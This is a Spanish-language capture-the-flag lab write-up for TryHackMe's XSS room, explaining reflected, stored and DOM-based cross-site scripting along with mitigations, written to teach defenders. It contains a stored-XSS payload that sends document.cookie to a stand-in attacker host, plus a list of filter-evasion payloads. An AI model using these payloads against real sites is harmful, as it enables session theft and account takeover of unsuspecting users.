# Writeup: TryHackMe — XSS (axss)

## Información
- **Plataforma:** TryHackMe
- **Room:** XSS (`/room/axss`)
- **Path:** Web Application Pentesting
- **Dificultad:** Easy / Fundamentals
- **Técnicas principales:** Reflected XSS, Stored XSS, DOM-based XSS
- **Fecha:** 2026-08-06

## Resumen ejecutivo

Room introductoria que recorre los tres tipos principales de Cross-Site
Scripting: Reflected, Stored y DOM-based. Cada escenario muestra cómo un input
del usuario, si no se valida ni escapa, termina ejecutándose como JavaScript en
el navegador de otra víctima.

## Conceptos clave

### Reflected XSS

El payload viaja en la request (URL, formulario) y el servidor lo devuelve en la
respuesta **sin persistirlo**. La víctima necesita abrir un enlace malicioso.

**Mecánica típica de la room:**

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.thm
```

Si la aplicación refleja el parámetro `q` en el HTML sin encoding:

```html
<p>Resultados para: <script>alert('XSS')</script></p>
```

El navegador ejecuta el script.

**Por qué funciona:** el servidor confunde datos con código. Inserta input de
usuario directamente en el cuerpo HTML sin convertir `<` en `&lt;`.

**Impacto real:** robo de cookies de sesión mediante redirección del documento o
`fetch` hacia un servidor controlado.

### Stored XSS

El payload se **almacena** en el servidor (comentario, post, perfil, log) y se
ejecuta cada vez que un usuario carga el recurso.

**Mecánica típica de la room:**

```html
<!-- Formulario de comentario o guestbook -->
<form method="POST" action="/comment">
  <textarea name="comment"></textarea>
</form>
```

Payload:

```html
<script>fetch('https://attacker.thm/?c='+document.cookie)</script>
```

Si el servidor guarda el comentario tal cual y lo muestra en la página de
detalles, cualquier visitante posterior ejecuta el payload.

**Por qué funciona:** la persistencia cruza requests. El atacante contamina una
vez; las víctimas ni siquiera necesitan hacer clic en un enlace externo.

**Impacto real:** compromiso masivo de sesiones, defacement persistente,
keylogging en la página afectada.

### DOM-based XSS

El payload nunca llega al servidor. JavaScript del lado cliente lee datos de
fuentes como `location.hash`, `location.search`, `document.URL`, `document.referrer`
o `window.name`, y los inserta en el DOM con métodos inseguros.

**Mecánica típica de la room:**

```javascript
// Código vulnerable en la página
var term = location.hash.slice(1);
document.write("<p>Buscando: " + term + "</p>");
```

Payload en la URL:

```
https://target.thm/#<img src=x onerror=alert(1)>
```

**Por qué funciona:** `document.write` interpreta el string como HTML. El hash
no se envía al servidor, por lo que un WAF tradicional no lo ve.

**Impacto real:** difícil de detectar en logs del servidor; el payload vive en
la URL o en el estado del navegador.

## Ataques / Tasks de la room

### Task: Reflected XSS

**Objetivo:** demostrar que un parámetro reflejado ejecuta JavaScript.

**Payload conceptual:**
```html
<script>alert(1)</script>
```

**Qué observar:**
- El navegador muestra un popup, confirmando ejecución.
- En DevTools → Elements se ve el script inyectado en el DOM.
- En DevTools → Network se ve la request con el payload en la URL.

**Por qué es un riesgo:** en un ataque real, `alert(1)` se reemplaza por código
que roba cookies, realiza acciones en nombre del usuario o redirige a phishing.

### Task: Stored XSS

**Objetivo:** almacenar un payload que se ejecute al recargar la página.

**Payload conceptual:**
```html
<script>alert(document.cookie)</script>
```

**Qué observar:**
- Después de enviar el formulario, el popup aparece al volver a la página.
- Otro usuario autenticado vería el mismo popup si cargara la página.

**Por qué es un riesgo:** escala sin interacción adicional del atacante.

### Task: DOM-based XSS

**Objetivo:** explotar una fuente del DOM sin que el payload viaje al servidor.

**Payload conceptual:**
```
#<img src=x onerror=alert(1)>
```

**Qué observar:**
- La URL contiene el payload después de `#`.
- En DevTools → Console aparece el `alert(1)`.
- En DevTools → Network no se envía el payload al servidor.

**Por qué es un riesgo:** bypass de controles server-side y de WAF.

## Errores comunes y lecciones

### Error: pensar que reemplazar `<script>` es suficiente

**Síntoma:** el payload `<script>` es bloqueado, pero `<img onerror=...>` o
`<svg onload=...>` funciona.

**Causa:** los filtros por blacklist son fáciles de evadir. Existen decenas de
etiquetas y event handlers.

**Solución:** usar escaping contextual en lugar de blacklist.

### Error: confundir Reflected con Stored

**Síntoma:** se cree que un Reflected XSS no es grave porque "la víctima tiene
que hacer clic".

**Causa:** subestimar el phishing dirigido. Un enlace malicioso en un email
oficial-looking sigue siendo vector real.

**Solución:** evaluar severidad según contexto: Stored suele ser más grave por
alcance, Reflected puede ser crítico si afecta a usuarios autenticados en
funciones sensibles.

### Error: olvidar el contexto de inserción

**Síntoma:** escapar `<` y `>` en un atributo HTML, pero no escapar comillas.

**Ejemplo vulnerable:**
```html
<input value="[USER_INPUT]">
```

Payload:
```html
" onmouseover="alert(1)
```

Resultado:
```html
<input value="" onmouseover="alert(1)">
```

**Solución:** el escaping debe ajustarse al contexto: HTML body, atributo,
JavaScript, URL o CSS.

### Error: confiar en HttpOnly como solución completa

**Síntoma:** "usamos HttpOnly, por eso no nos preocupa XSS".

**Causa:** HttpOnly solo evita que JavaScript lea ciertas cookies. No previene
keylogging, redirecciones, CSRF interno, exfiltración de otros datos ni
defacement.

**Solución:** HttpOnly es una capa de mitigación, no una solución. El control
principal sigue siendo validación + escaping.

## Variantes y uso real

- **XSS en atributos:** `" autofocus onfocus=alert(1)//`.
- **XSS vía SVG:** `<svg onload=alert(1)>`.
- **XSS vía JavaScript URI:** `javascript:alert(1)`.
- **XSS con encoding:** `&#x3c;script&#x3e;` o `\u003cscript\u003e` para evadir
filtros simples.
- **Mutation XSS:** el navegador repara HTML malformado de formas que el
filtro no anticipó.
- **mXSS / DOM Clobbering:** técnicas avanzadas donde el atacante manipula el
DOM para alterar el comportamiento del parser.

## Mitigaciones

1. **Escapado/encoding contextual:** la única defensa robusta. Depende del
contexto exacto de inserción.
2. **CSP (Content Security Policy):** reduce el impacto limitando de dónde se
cargan scripts, pero no previene el XSS en sí.
3. **HttpOnly cookies:** limita el robo de cookies por JavaScript.
4. **SameSite cookies:** mitiga el envío de cookies en requests cross-site.
5. **Validación de input:** whitelist de tipos/formatos permitidos.
6. **Sanitización:** usar librerías como DOMPurify cuando se permita HTML
enriquecido.
7. **Evitar métodos inseguros del DOM:** no usar `document.write`,
`innerHTML`, `eval`, `setTimeout(string)` con datos no confiables.

## Herramientas usadas

- Navegador con DevTools (Elements, Console, Network).
- Burp Suite Community / Repeater para repetir requests (si se usó).

## Material de referencia

- PortSwigger Web Security Academy — XSS topic.
- OWASP XSS Prevention Cheat Sheet.
- OWASP DOM based XSS Prevention Cheat Sheet.

## Autoevaluación

1. ¿En qué se diferencia Reflected de Stored XSS en términos de persistencia y
entrega?
2. ¿Por qué DOM-based XSS puede no aparecer en los logs del servidor web?
3. Nombra tres contextos de inserción y el tipo de escaping que requieren.
4. ¿Qué mitigación reduce el impacto pero no previene que el XSS ocurra?
5. ¿Por qué `HttpOnly` no es suficiente contra XSS?

---

**Reglas del repo:** este writeup no incluye flags ni respuestas literales.
